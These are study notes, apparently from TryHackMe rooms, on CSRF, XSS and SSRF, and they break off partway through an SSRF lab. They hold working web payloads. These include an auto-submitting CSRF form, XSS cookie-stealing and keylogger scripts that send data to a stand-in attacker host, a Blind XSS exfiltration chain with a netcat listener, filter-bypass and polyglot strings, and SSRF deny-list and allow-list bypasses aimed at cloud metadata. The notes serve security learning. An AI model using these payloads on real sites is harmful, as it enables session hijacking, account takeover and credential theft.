**The mechanic, precisely:** the browser sends cookies with every request to a matching domain — it does not care whether that request was triggered by a page on the real site or by `evil-site.com` somewhere else. If a user logged into `staffhub.thm` visits another site, that other site can trigger a request to `staffhub.thm`, and the browser will still attach the `staffhub.thm` session cookie. From the server's point of view, the request looks indistinguishable from one the user made intentionally.

**Three conditions that must all be true for CSRF to work:**

1. The victim is authenticated to the target application
2. The application performs a **state-changing action** (settings update, data modification, etc.)
3. The application does **not verify the request's origin**

If all three hold, an attacker can perform actions as the victim without ever learning their credentials.

> [!summary] Quick Recap — Why CSRF Works
> 
> - Root cause is application trust, not browser misbehaviour — cookies are auto-attached by design
> - Three necessary conditions: authenticated victim + state-changing action + no origin verification
> - Removing any one of the three conditions breaks the attack — this is exactly where defences target

---

#### Finding CSRF Vulnerabilities

**The question to ask about every feature:** _can this action be triggered without verifying the request actually came from the user?_ If yes, it's a candidate.

**Where to focus** — state-changing requests are the primary targets, not read-only ones. Anything that modifies data: password changes, email updates, account settings, financial transactions. If these lack a protection mechanism (a CSRF token, origin/referer checks), they're likely exploitable.

**GET vs POST — a common misconception:** using `POST` does **not** automatically protect against CSRF. Both `GET` and `POST` can be forged if the app doesn't verify request origin — and `GET`-based CSRF is often _easier_ to exploit, since it can be triggered through a plain link or even an `<img>` tag with no form or JavaScript required. **Never rely on HTTP method alone when testing for CSRF.**

> [!summary] Quick Recap — Finding Vulnerabilities
> 
> - Test question: can this fire without confirming it actually came from the user?
> - Prioritise state-changing endpoints over read-only ones
> - `POST` ≠ safe by default — `GET`-based CSRF is often simpler to weaponise (links, images)

---

#### Exploitation Using an HTML Form

**Target feature:** StaffHub's "update email" action on the settings page — submits via a plain `POST` to `update_email.php`:

```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <i class="material-icons prefix">alternate_email</i>
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>
    <button class="btn waves-effect waves-light teal btn-rounded" type="submit">
        Update Email
        <i class="material-icons right">save</i>
    </button>
</form>
```

**Why it's exploitable:** the request carries only the `email` parameter — no token, no additional verification. Anyone who knows this structure can reproduce it from anywhere.

**The malicious page** — a hidden, auto-submitting form pointed at the real endpoint:

```html
<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
```

Hosted at `/var/www/html/settings.html` on the AttackBox (`cd /var/www/html`, `nano settings.html`), served at `http://CONNECTION_IP:81/settings.html`.

**The redirect after submission is a deliberate detail** — it sends the victim back to the legitimate settings page after the forged request fires, reducing the chance they notice anything happened.

**Delivery:** any social engineering vector — a chat link, an email — gets the victim to open the page while still logged into StaffHub in the same browser. On page load, the hidden form auto-submits, the browser attaches the session cookie automatically, and the email address changes to the attacker's value with **zero interaction** from the victim beyond opening the link.

> [!summary] Quick Recap — HTML Form Exploitation
> 
> - No CSRF token on the target request at all = trivially reproducible from any external page
> - Auto-submitting hidden form + `setTimeout` redirect = fire-and-cover-tracks pattern
> - Victim needs to do nothing but open the link while authenticated — the form does the rest

---

#### Exploitation Over Weak Tokens

Developers often add a CSRF token as a defence — but a token only helps if it's **unique, unpredictable, and properly validated**. A weak or reversible token generation scheme can still be bypassed.

**Target feature:** StaffHub's "update role" action — protected by a CSRF token that looks secure at a glance:

```html
<input type="hidden" name="csrf_token" value="YWRtaW4=">
```

**The flaw:** the token isn't randomly generated — it's the **Base64-encoded value of the user's role**. Decoding `YWRtaW4=` gives `admin`. A tool like CyberChef or any online Base64 decoder confirms it instantly.

> [!warning] Predictable ≠ protected Since the token is derived from data the attacker already knows or can guess (the target role), the "protection" is trivially reproducible — the attacker just Base64-encodes their own known value and drops it straight into the forged request.

**The payload** — an image-based CSRF using an `onmouseover` handler rather than an auto-submitting form, hosted as `/var/www/html/role.html`:

```html
<html>
<body>

<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>

<img src="http://staffhub.thm:8080/one.png"
onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
width="400">

</body>
</html>
```

Served at `http://CONNECTION_IP:81/role.html`. Hovering the image redirects the browser to the vulnerable `GET` endpoint, carrying both the forged `role` parameter and the correctly-guessed `csrf_token` — since it's a `GET` request, the session cookie is attached automatically and no user interaction beyond a mouse hover is needed.

**Delivery:** same social engineering approach — send the link, victim (already logged in) opens it and hovers the image, browser fires the request, role changes from `admin` to `staff` with the victim none the wiser.

> [!summary] Quick Recap — Weak Token Exploitation
> 
> - A CSRF token defence is only as strong as its generation method — predictable/reversible tokens are effectively no protection at all
> - Base64 (or any reversible encoding) of known/guessable data is a common weak-token pattern to check for
> - `GET`-based CSRF can be delivered via a plain `<img>`/link with an event handler — no form or auto-submit script required

---

#### Best Practices — Finding CSRF Efficiently

**Testing checklist:**

1. **Focus on state-changing requests** — password changes, email updates, account settings, financial transactions are the primary targets, not read-only endpoints
2. **Inspect requests for CSRF tokens** — no token, or a static/predictable one, both count as vulnerable
3. **Analyse HTTP methods** — sensitive actions should be `POST`; if performed via `GET`, they're exploitable through nothing more than a link or image
4. **Test outside the application** — reproduce the request from an external HTML page; if it succeeds with no additional verification, the endpoint is vulnerable
5. **Observe cookie behaviour** — if auth relies solely on session cookies with no origin validation, CSRF is possible by definition

> [!summary] Quick Recap — Best Practices
> 
> - Same 5-point checklist every time: state-changing endpoints → token presence/quality → HTTP method → external reproduction test → cookie-only auth check
> - "Does a token exist" isn't the full question — "is the token unique, unpredictable, and properly validated" is
> - Reproducing the request from a page outside the app is the definitive test — if it works, it's vulnerable

---

> [!summary] Full CSRF Room — One Glance
> 
> - Mechanism: browsers auto-attach cookies to same-domain requests regardless of origin; apps that trust cookie presence alone are exploitable
> - Three required conditions: authenticated victim + state-changing action + no origin verification
> - No token at all → trivial hidden-form auto-submit exploitation (email update example)
> - Weak/predictable token (e.g. Base64 of known data) → still exploitable, just needs decoding first (role update example)
> - `GET` requests are just as exploitable as `POST` — often more so, since they need only a link or an image event handler
> - Testing checklist: state-changing focus → token quality → HTTP method → external reproduction → cookie-only auth check

### XSS Introduction

> [!info] Room context Cross-Site Scripting (XSS) — one of the easiest paths to compromising users of a web app: session theft, malware delivery, in-network attack escalation. Scenario target: an internal app with a public comments section, a user dashboard, and a news search feature. Covers terminology, payload construction, all three core XSS types (Reflected, Stored, DOM-based), Blind XSS, and a hands-on "perfect the payload" gauntlet across 6 escalating filter/context scenarios.

#### Important Terminology

- **DOM (Document Object Model)** — the browser's live, structured representation of a page: a tree of elements (tags, text, attributes) that JavaScript can read and modify. When JS updates the DOM, the visible page updates immediately — this is the mechanism DOM-based XSS abuses directly.
- **URL parameters (query strings)** — everything after `?` in a URL (e.g. `?q=hello`). User-controllable via address bar or links/forms → **always untrusted input**.
- **JavaScript** — the runtime XSS payloads execute in. Runs in the victim's page context: can read/modify the DOM, make network requests, access cookies (unless protected).
- **Cookies** — small browser-stored data (session IDs, preferences). If JS-readable and an attacker can run JS via XSS, the cookie can be stolen and the session hijacked. **`HttpOnly`** is the flag that blocks JS from reading a cookie — a real, meaningful mitigation.
- **Escaping (output encoding)** — transforms user data so the browser treats it as plain text, not code (`<` → `&lt;`). Different from **input validation/filtering**, which only checks that input _looks_ allowed (letters, numbers, length) but doesn't stop it becoming executable code once placed into a page. `<script>alert(1)</script>` escaped for HTML becomes `&lt;script&gt;alert(1)&lt;/script&gt;` — inert text, not code.

> [!warning] Filtering ≠ escaping This distinction is the crux of most XSS defence failures in this room: a filter that blocks a _word_ (like `script`) is not the same as escaping _output_. Filters get bypassed; proper contextual escaping doesn't.

> [!summary] Quick Recap — Terminology
> 
> - DOM = live page structure JS can read/write; the direct attack surface for DOM-based XSS
> - `HttpOnly` cookies can't be read by JS — a real defence against session-stealing payloads
> - Escaping (transform to inert text) ≠ filtering/validation (checking shape) — only escaping actually neutralises injected code

---

#### XSS Payload — Structure and Intentions

**What a payload is:** the JavaScript an attacker injects into a vulnerable app so it runs in another user's browser. Once a vulnerable site echoes unfiltered user input back into the page, the browser can't distinguish the injected code from legitimate page code.

**Two parts to every payload:**

- **Intention** — what the attacker actually wants: proof of concept, cookie theft, keylogging, acting on the user's behalf
- **Modification** — how the payload must be adapted to the specific injection context (escaping out of an HTML tag, an attribute, or an existing JS block). Pentesters rarely reuse the exact same payload across targets — the surrounding context always dictates the shape.

**Confirming basic execution — the standard test payload:**

```html
<script>alert('XSS')</script>
```

A pop-up confirms JS execution is possible; from there, swap in something with actual impact.

**Common injection points:** search fields, comment sections, profile names, feedback forms, URL parameters. Classic pattern — a search page reflects the query straight into the page:

```
https://site.thm/search?q=hello
→ "You searched for: hello"
```

Supplying `<script>alert(1)</script>` as `q` instead, with no sanitisation, executes it.

**Payload intentions, by example:**

**Proof of Concept** — simplest possible payload, purely demonstrative:

```html
<script>alert('XSS')</script>
```

**Session stealing** — exfiltrates cookies to an attacker-controlled server:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

`btoa()` Base64-encodes the cookie for safe transmission over the URL.

**Key logger** — captures every keystroke:

```html
<script>
document.onkeypress = function(e) {
fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>
```

**Business logic attack** — abuses app-specific JS functions directly:

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

A successful email change here opens the door to a password reset and full account takeover.

> [!summary] Quick Recap — Payload Structure
> 
> - Every payload = intention (what it does) + modification (how it fits the injection context)
> - `<script>alert('XSS')</script>` is the universal first test — confirms execution before building anything more useful
> - Cookie theft (`fetch` + `btoa(document.cookie)`), keylogging, and business-logic abuse are the three go-to escalation patterns once execution is confirmed

---

#### Reflected XSS (Non-Persistent)

**Mechanism:** the app takes user input (query string, form field, header) and immediately reflects it back into the page **without sanitising it**. The payload lives entirely in the crafted link/request — nothing is stored server-side. An attacker crafts a malicious URL and gets the victim to click it; because the site "reflects" the input, the browser executes it in the site's own origin.

**Typical triggers:** search boxes, error messages, any page echoing URL/`POST` parameters back into its output.

**Impact once triggered:** the script can read/modify the page, steal cookies/session tokens (unless `HttpOnly`), act on the user's behalf, or load further malicious content. **Root cause is always the same shape:** untrusted data output as code instead of escaped for its context.

**Practical — AtlasNews search (`http://MACHINE_IP:5000`):**

```python
@app.route("/")
def home():
    q = request.args.get("q", "")
    query_escaped = escape(q)
    return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)
```

Testing with `product` in the search box behaves normally. Testing with:

```html
<script>alert('Hack')</script>
```

...pops an alert, confirming reflected XSS: the `q` query parameter is read straight from the URL and rendered back into the page.

**Root cause, precisely:** the handler passes the **raw** `q` value into the template (`query=q`) alongside an escaped copy (`query_escaped`) that presumably goes unused in the vulnerable code path — the template renders the raw variable rather than the escaped one. `q = request.args.get("q", "")` is the untrusted source.

> [!summary] Quick Recap — Reflected XSS
> 
> - Payload lives in the URL/request itself — nothing persists server-side, each victim needs their own malicious link
> - Root cause pattern: raw request parameter passed straight into template rendering, bypassing any escaped copy that may exist alongside it
> - Classic delivery: a crafted link sent via phishing/social engineering, since the payload must be re-delivered every time

---

#### Stored XSS (Persistent)

**Mechanism:** attacker-controlled input gets **saved server-side** (typically a database) and later served to other users without escaping — the injected script runs in **every visitor's browser** who views the affected content, not just the original submitter.

**Why it's worse than reflected:** persistence. One successful injection can affect every subsequent visitor — including admins — until the malicious data is removed. Common locations: comment sections, user profiles, message boards, product reviews, file-upload metadata rendering.

**Practical — AtlasNews Guestbook (`http://MACHINE_IP:5000/guestbook`):**

Submitting `<script>alert('You are Hacked')</script>` as a comment saves it. **Reloading the page** — no re-submission needed — triggers the alert, confirming the payload persists and fires for any visitor.

**Root cause:** the app rendered attacker-controlled input as raw HTML (`{{ query|safe }}` and `{{ c.comment|safe }}` in the template) — the `|safe` filter is a Jinja2/Flask directive that explicitly **disables** automatic escaping for that value. Comments were stored raw and rendered with escaping deliberately bypassed, treating untrusted input as though it were already known-safe.

> [!warning] `|safe` is a loaded gun Any template engine's "mark as safe" directive (Jinja2's `|safe`, similar constructs elsewhere) is a manual override of the framework's default auto-escaping. It exists for legitimate cases (rendering trusted, pre-sanitised HTML) but is one of the most common self-inflicted stored XSS root causes when applied to raw user input.

> [!summary] Quick Recap — Stored XSS
> 
> - Persistence is the defining trait — one injection, many victims, over time, no re-delivery needed
> - Root cause: explicit escaping bypass (`|safe` or equivalent) applied to untrusted stored data
> - Highest-value targets: anything an admin or privileged user is likely to eventually view (support tickets, reported comments, flagged content)

---

#### DOM-Based XSS

**Mechanism:** entirely client-side. JavaScript already running on the page reads attacker-controllable data straight from the DOM/browser environment (`URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, etc.) and writes it back into the page using a **dangerous sink** (`innerHTML`, `document.write`, `eval`). The payload **never touches the server** — the browser's own DOM is the entire attack surface.

**Practical — AtlasNews DOM preview (`http://MACHINE_IP:5000/dom`):**

Entering the following into the manual preview text field:

```html
<img src=x onerror="alert('Hacked you again')">
```

...triggers the alert on submission. The invalid `src=x` fails to load, firing `onerror`, which executes the injected JS.

**Root cause:** client-side script reads attacker-controlled input and writes it directly into the page via `innerHTML` — the browser parses that string as HTML/markup, not text, so the `<img onerror=...>` tag is instantiated and its event handler fires. The input never reaches the server, which means **server-side defences (WAFs, backend sanitisation) provide zero protection here** — the fix has to live in the client-side JS itself.

> [!summary] Quick Recap — DOM-Based XSS
> 
> - The server is never involved — data flows from a browser-side source (URL fragment, `localStorage`, etc.) straight into a dangerous sink (`innerHTML`, `eval`) within client-side JS
> - Because it's fully client-side, server-side sanitisation/WAFs don't help at all — the vulnerable code itself must be fixed
> - `<img src=x onerror=...>` is a reliable trigger pattern whenever a `<script>` tag itself gets filtered or `innerHTML` won't execute injected `<script>` directly

---

#### Blind XSS

**What makes it "blind":** functionally a subtype of Stored XSS — the payload gets saved and later rendered for another user — but **the attacker never sees it fire**, and can't test it against themselves first. The vulnerable page (e.g. an internal staff support-ticket viewer) isn't accessible to the attacker at all; only the intended victim (staff) ever loads it.

**Real-world shape:** a public-facing contact form feeds into a private internal ticket system. An attacker submits a malicious message; a staff member later opens it in a private portal the attacker can't reach directly. If the payload executes, it can phone home with the staff portal's URL, the staff member's cookies, and even the rendered page contents — enabling session hijacking into a system the attacker never had access to.

**Testing requirement:** a Blind XSS payload **must include a callback** (typically an outbound HTTP request) — that callback is the only signal the attacker ever gets that the payload fired. Dedicated tooling like **XSS Hunter Express** automates capturing cookies, URLs, and page contents from these callbacks; a bare Netcat listener works fine for basic confirmation.

**Practical — Acme IT Support (`http://MACHINE_IP:8080`):**

1. Sign up via **Customers → Signup here**, log in, go to **Support Tickets**
2. Create a test ticket (Subject/Contents: `test`) — view its source: submitted text lands inside a `<textarea>` tag
3. **Escaping the textarea** — new ticket, Subject:
    
    ```html
    </textarea>test
    ```
    
    Viewing source confirms the `textarea` tag is successfully closed early
4. **Confirming JS execution** — new ticket, Subject:
    
    ```html
    </textarea><script>alert('THM');</script>
    ```
    
    Opening the ticket now pops an alert — confirms the create-ticket feature is exploitable, and critically, that a staff member viewing it would execute it too

**Extracting cookies — full exfiltration chain:**

Set up a listener on the AttackBox first:

```bash
nc -nlvp 9001
```

- `-l` listen mode
- `-p` specify port
- `-n` skip DNS resolution
- `-v` verbose

Payload (Ticket Subject):

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

Breakdown:

- `</textarea>` — closes the text field early
- `<script>` — opens the injectable JS block
- `fetch()` — fires the outbound HTTP request
- `URL_OR_IP` / `PORT_NUMBER` — attacker's catcher (THM request catcher, AttackBox IP, or VPN IP + listener port)
- `?cookie=` — query string carrying the stolen data
- `btoa(document.cookie)` — Base64-encodes the victim's (staff member's) cookies for safe transport in a URL

Wait up to a minute after submission for a staff member (simulated) to view the ticket — the Netcat listener catches the inbound request with the encoded cookie, decodable via any Base64 decoder.

> [!note] VPN reliability The room notes that receiving the callback can be flaky over a personal VM + VPN setup — the AttackBox is the more reliable choice for this specific task.

> [!summary] Quick Recap — Blind XSS
> 
> - Same storage mechanism as Stored XSS, but the attacker has no visibility into the vulnerable page at all — a callback is the _only_ confirmation channel
> - `</textarea>` escape + `<script>` injection is the standard pattern when input lands inside a textarea
> - `fetch()` + `btoa(document.cookie)` to an attacker-controlled listener is the standard cookie-exfiltration payload shape, reusable well beyond just Blind XSS scenarios
> - Set up the callback listener (Netcat or a dedicated tool like XSS Hunter Express) _before_ submitting the payload

---

#### Perfecting Your Payload — 6-Level Context/Filter Gauntlet

Goal at every level: pop `alert('THM')`. Each level changes **where** the input lands in the page and/or applies a filter — the payload has to be shaped to match.

**Level One — direct HTML context, no filtering.** Name reflected as plain text in the page body.

```html
<script>alert('THM');</script>
```

Works immediately — no escaping needed to break out of anything, since the reflection point is already a raw content context.

**Level Two — inside an `input` tag's `value` attribute.** A `<script>` tag placed here won't execute — you're inside an attribute, not the tag body. Payload must **close the attribute and the tag first**:

```html
"><script>alert('THM');</script>
```

The `">` is the operative part: closes `value="..."`, then closes the `<input>` tag itself, before the `<script>` begins.

**Level Three — inside a `textarea` tag.** Different closing sequence than an `input` — no attribute to close, but the `textarea` element itself needs closing:

```html
</textarea><script>alert('THM');</script>
```

`</textarea>` is the key — everything inside a textarea is treated as literal text until that closing tag appears.

**Level Four — reflected inside existing JavaScript code**, not HTML markup. Looks like Level One at a glance, but the reflection point is a JS string literal. Payload breaks out of the existing statement:

```javascript
';alert('THM');//
```

- `'` closes the existing string/field assignment
- `;` ends the current statement
- `//` comments out everything remaining on that line, preventing a syntax error from leftover original code

**Level Five — word-based filter strips the literal string `script`.** `<script>...</script>` gets mangled because the filter removes any occurrence of "script" from the input — but it only removes it **once**, and doesn't re-scan the result. Exploit by nesting the banned word inside itself:

```html
<sscriptcript>alert('THM');</sscriptcript>
```

The filter finds and strips one occurrence of the substring `script` out of `sscriptcript` — removing it from the middle leaves the surrounding characters (`s...cript` → `s` + `cript`) collapsing back together into exactly `script`, so `<sscriptcript>` becomes `<script>` after the filter runs. The core trick — **doubling up the filtered word so removing one occurrence reconstructs the original tag** — is the transferable technique here, regardless of the exact substring positioning for a given filter implementation.

**Level Six — reflected inside an `img` tag's `src` attribute, AND `<`/`>` characters are stripped.** Since angle brackets themselves are filtered, you can't close/open tags at all — you're stuck working **within the existing `<img>` tag's attributes**. Solution: use another attribute of the same tag rather than trying to escape it:

```
/images/cat.jpg" onload="alert('THM');
```

The `"` closes the `src` attribute value, then `onload="..."` adds a new attribute to the **same** `<img>` tag — no new tag needed, so no `<`/`>` required at all. `onload` fires once the (broken) image path attempt completes.

**XSS Polyglots** — a single string engineered to break out of multiple contexts (HTML tag, attribute, JS block) and dodge common filters simultaneously, in one shot:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

Could have been dropped into all six levels above and succeeded without per-level customisation — useful as a fast initial probe when the injection context is unknown, though understanding _why_ each level's targeted payload works is the actual skill being built here.

> [!summary] Quick Recap — Perfecting Payloads
> 
> - Always identify **where** the reflection lands first (raw body / attribute / textarea / JS string) before choosing a payload shape
> - `">` closes an attribute+tag; `</textarea>` closes a textarea; `';...//` breaks out of an existing JS statement
> - Word filters that don't re-scan after stripping can be beaten by nesting the banned word inside itself (`sscriptcript`)
> - Character filters (`<`/`>` stripped) push you toward attribute-only techniques — `onload`/`onerror` on an existing tag instead of injecting a new one
> - A polyglot trades precision for universality — good for fast probing, but purpose-built payloads are still the sharper tool once context is known

---

> [!summary] Full XSS Room — One Glance
> 
> - **Reflected**: payload lives in the request, reflects immediately, no persistence — needs re-delivery per victim
> - **Stored**: payload persists server-side (often via a bypassed `|safe`/auto-escape), fires for every subsequent viewer
> - **DOM-based**: fully client-side, source → dangerous sink (`innerHTML`, `eval`) — server-side defences don't apply
> - **Blind**: Stored XSS the attacker can't see fire — payload _must_ include a callback (fetch/`btoa(document.cookie)` to a listener) for confirmation
> - Context dictates payload shape every time: raw HTML body, attribute value, textarea body, and existing JS all need different escape sequences
> - Filters that strip words/characters without re-scanning or without blocking alternate attributes (`onload`, `onerror`) are reliably bypassable
> - `HttpOnly` cookies and genuine output escaping (not just input filtering) are the actual defences — everything else is a speed bump

### Intro to SSRF

> [!info] Room context Server-Side Request Forgery (SSRF) — an attacker manipulates a parameter the application uses to build a **server-side** HTTP request, redirecting it to an internal service, a cloud metadata endpoint, or an attacker-controlled server. SSRF works because internal systems trust requests originating from the application server's own IP — the attacker inherits that trust rather than needing to defeat it directly.

#### What Is SSRF — Types and Impact

**Two categories, and the distinction changes exploitation approach entirely:**

|Type|Response Visible?|Description|
|---|---|---|
|**Regular SSRF**|Yes|Back-end request's response is returned in the app's front-end response — directly readable|
|**Blind SSRF**|No|Back-end request fires, but no response is returned — exploitation confirmed only through indirect signals|

With Regular SSRF, forcing the server to fetch an internal admin page returns that page's contents right in the HTTP response — immediate, readable output. With Blind SSRF, the app might show a fixed "success" message regardless of what actually happened server-side — but it's still exploitable: point the request at a server you control (Burp Collaborator, etc.) and watch for a callback, or use response timing/error message differences between reachable and unreachable internal hosts to infer information.

**Impact, scaled by what's reachable from the app server:**

|Impact|Description|
|---|---|
|Access to internal endpoints|Admin panels/config UIs/monitoring dashboards not exposed to the internet become reachable — IP-based access controls bypassed since the request _originates_ from the server itself|
|Sensitive data exposure|Backend databases, private APIs, internal tooling trusting the server's network position may hand back customer data, org records, secrets|
|Internal network reconnaissance|Timing/status-code/error-message variation across different internal IPs and ports maps out internal hosts and services|
|Cloud metadata theft|`169.254.169.254` (AWS/GCP/Azure instance metadata endpoint) — reachable via SSRF, yields temporary credentials, IAM role details, instance config|
|Credential/token leakage|Inter-service auth tokens/secrets can be intercepted, especially where backend traffic runs over plain HTTP|

> [!summary] Quick Recap — What Is SSRF
> 
> - SSRF = the app server itself becomes the attacker's proxy into the internal network
> - Regular = readable response; Blind = confirmed only via callback/timing/error inference
> - Cloud metadata (`169.254.169.254`) is the single highest-value target when reachable — direct path to temporary cloud credentials

---

#### SSRF Examples — Recognising the Vectors

SSRF rarely shows up as an obvious full URL parameter — recognising the _pattern_ of user input feeding a server-side request matters more than any single signature.

**1. Full URL in a parameter** — most direct form. URL previews, webhook configs, PDF generators commonly take a complete URL as input.

```
https://website.thm/item/2?server=api
→ server-side request: https://server.website.thm/api/item?id=2
```

|Input|Resulting Server-Side Request|
|---|---|
|`server=api`|`https://server.website.thm/api/item?id=2`|
|`server=server.website.thm/flag?id=9&x=`|`https://server.website.thm/flag?id=9&x=/api/item?id=2`|

The trailing `&x=` neutralises whatever the app appends afterward, absorbing it into an unused parameter — a common trick for controlling exactly where the injected payload "ends" from the server's perspective.

**2. Partial URL (hostname or path only)** — app accepts just a hostname/path, builds the rest server-side. Developers sometimes assume this limits attack surface — it usually doesn't, if the value isn't checked against an allow list.

```
https://website.thm/stock?server=api.internal
→ https://api.internal/stock/item

?server=attacker.com
→ request goes straight to the attacker's domain
```

Reflected response → direct exfiltration; blind → still confirms the vulnerability via an inbound connection to the attacker's server.

**3. Path traversal in the URL** — attacker controls only a path segment; directory traversal reaches endpoints outside the intended directory:

```
https://website.thm/stock?url=/item/123/details
```

Supplying `/../admin` → server requests `https://website.thm/admin`. Same underlying technique as file inclusion vulnerabilities, applied to URL paths instead of filesystem paths.

**4. Hidden form fields** — not visible in the URL bar at all; embedded in HTML source, discoverable only via source inspection or proxy interception:

```html
<input type="hidden" name="avatar" value="/images/avatars/default.png">
```

If the server fetches whatever path this field holds, modifying the value (DevTools or Burp) redirects the fetch to an internal resource. **This is why thorough testing means inspecting form fields and API requests, not just visible URL parameters.**

> [!summary] Quick Recap — SSRF Vectors
> 
> - Four patterns to recognise: full URL param, partial URL (hostname/path only), path traversal within a URL param, hidden form field
> - "Limited" input (hostname-only, path-only) is not inherently safer — it just requires a different bypass shape
> - Hidden fields require manual source inspection or proxy interception — they won't show up just browsing normally

---

#### Finding SSRF

**Common indicators to scan for while testing:**

- Full URL visible as a query parameter in the address bar
- Hidden form fields (only visible via page source / proxy)
- Partial URL — hostname only, app builds the rest
- Path only — app prepends scheme and hostname

**Application features that frequently hide SSRF vectors:**

|Feature|Why It's Relevant|
|---|---|
|Webhook configuration|App requests a user-supplied URL to verify the endpoint|
|PDF/report generation|Server fetches content from a supplied URL to render into a document|
|URL preview/unfurling|App retrieves metadata (title, thumbnail) from a user-provided link|
|File import by URL|Server downloads a file from a remote, user-specified location|
|Integration settings|Third-party service URLs stored and queried server-side|

A full URL parameter is straightforward to test; a bare path segment may take considerable trial and error to weaponise. **Recognise the pattern first, then iterate on payloads.**

**Confirming Blind SSRF — when no response is reflected:**

|Method|How It Works|
|---|---|
|External HTTP logger (e.g. requestbin.com)|Supply the logger URL as the payload; check its dashboard for inbound requests from the target|
|Burp Collaborator|Unique domain logging HTTP _and_ DNS callbacks — useful when HTTP is blocked but DNS resolution still occurs|
|Self-hosted listener (`python3 -m http.server`)|Simple HTTP server on your own machine, watch for inbound connections|
|Timing analysis|Compare response times for requests to internal hosts that exist vs. don't — consistent differences imply real resolution/connection attempts|
|Error-based inference|Different error messages for reachable vs. unreachable hosts leak internal network info even with the response body hidden|

> [!summary] Quick Recap — Finding SSRF
> 
> - Test every feature that fetches remote content on the server's behalf: webhooks, PDF generation, link previews, file import, integrations
> - Recognise the pattern before trying to craft a working payload — path-only and hostname-only inputs need more iteration than full URLs
> - No visible response ≠ not vulnerable — Collaborator/logger callbacks, timing, and error differences all confirm Blind SSRF

---

#### Defeating Common SSRF Defences

Three defensive categories, each with characteristic bypasses.

#### Deny Lists

Blocks specific addresses/patterns (localhost, `127.0.0.1`, cloud metadata IP), permits everything else. **Inherently fragile** — string-matching a small set of "known bad" representations misses the many other ways to express the same address.

**Loopback address alternate representations:**

|Representation|Value|
|---|---|
|Standard|`127.0.0.1`|
|Decimal|`2130706433`|
|Octal|`017700000001`|
|Shorthand|`127.1` or `0` or `0.0.0.0`|
|Wildcard|`127.*.*.*`|
|IPv6|`[::1]`|
|DNS-based|`127.0.0.1.nip.io`|

**DNS-based bypass is particularly effective** — `nip.io` lets an attacker mint a subdomain that resolves to an arbitrary IP. `127.0.0.1.nip.io` _resolves to_ `127.0.0.1`, but a string-matching deny list sees an ordinary-looking domain name and passes it straight through — the malicious resolution only happens later, at DNS lookup time, which the deny list never inspects.

Same trick applies to cloud metadata: an attacker's own domain with a DNS record pointing at `169.254.169.254` sails past a hostname-string deny list — the server resolves the hostname itself and lands directly on the metadata service.

#### Allow Lists

Denies everything by default; permits only approved destinations/patterns (e.g. must begin with `https://website.thm`). **Stronger control than a deny list** — but implementation flaws still create bypasses:

|Bypass Technique|Example|Why It Works|
|---|---|---|
|Subdomain matching|`https://website.thm.attackers-domain.thm`|String _begins with_ the expected prefix — but the actual resolved hostname is `attackers-domain.thm`|
|URL credential abuse|`https://website.thm@attacker.com/`|Some HTTP libraries parse everything before `@` as **credentials**, everything after as the **hostname** — the allow list's naive string check sees `website.thm`, but the request actually goes to `attacker.com`|

**Root cause in both cases:** the app validates the URL as a raw **string** (prefix matching) rather than properly **parsing** it into scheme/userinfo/host/path components first.

#### Open Redirect Chaining

When both deny-list and allow-list bypasses fail directly, chain through an **open redirect** already present on the trusted domain — an endpoint that forwards visitors to a URL specified in a parameter (commonly used for click tracking).

```
https://website.thm/link?url=https://tryhackme.com
```

If SSRF protections only require the URL to _begin with_ `https://website.thm/`, this passes validation trivially:

```
https://website.thm/link?url=http://169.254.169.254/latest/meta-data/
```

The allow list is satisfied (string starts correctly) — but the server follows through to the open redirect endpoint, which then forwards the request straight to the cloud metadata service. **The app's own legitimate feature is repurposed to defeat its own protection.**

> [!warning] The real lesson here This bypass works by chaining two features that are each individually harmless — an allow list doing its job correctly, and a redirect feature doing its job correctly. Security controls have to account for **interactions between features**, not just each feature's isolated behaviour.

> [!summary] Quick Recap — Defeating Defences
> 
> - Deny lists: beaten by alternate address representations (decimal/octal/shorthand IPs) and DNS-based tricks (`nip.io`, attacker-controlled domains pointing at internal IPs)
> - Allow lists: beaten by subdomain matching (`trusted.thm.attacker.com`) and URL credential syntax abuse (`trusted.thm@attacker.com`) — both exploit string-prefix checks instead of proper URL parsing
> - Open redirects on the _trusted_ domain can be chained to reach anywhere, since the allow list only ever sees the trusted domain in the request

---

#### SSRF Practice — Acme IT Support

**Chain:** hidden form field vector + directory-traversal deny-list bypass.

**Scenario:** two discovered endpoints —

|Endpoint|Behaviour|
|---|---|
|`/private`|Errors, stating content can't be viewed "from your IP address" — restricted by source IP|
|`/customers/new-account-page`|Newer account page with a profile avatar selection feature|

`/private` is the target; the avatar feature is the attack vector.

**Step 1 — locate the avatar feature.** Create an account, sign in, visit `/customers/new-account-page`, view page source. Each avatar option is a radio button whose `value` attribute holds an image file path:

```html
<input type="radio" name="avatar" value="/images/avatars/default.png">
```

If the server fetches whatever this field contains, an unvalidated value can redirect that fetch anywhere on the server.

**Step 2 — observe server-side fetch behaviour.** Select an avatar, click **Update Avatar**. Page source now shows the image rendered as a **data URI** — the actual image bytes, Base64-encoded, embedded directly in the `src` attribute. This confirms: the server fetches the resource at the given path, reads the response body, and encodes it into the page. If that path can be redirected to `/private` instead of an image, `/private`'s contents come back as Base64 text in the page source.

**Step 3 — attempt direct access to `/private`.** DevTools → Inspect a radio button → change `value` to `private`, select it, **Update Avatar**. Result: an explicit error — the app blocks any path starting with `/private`. **Deny list confirmed.**

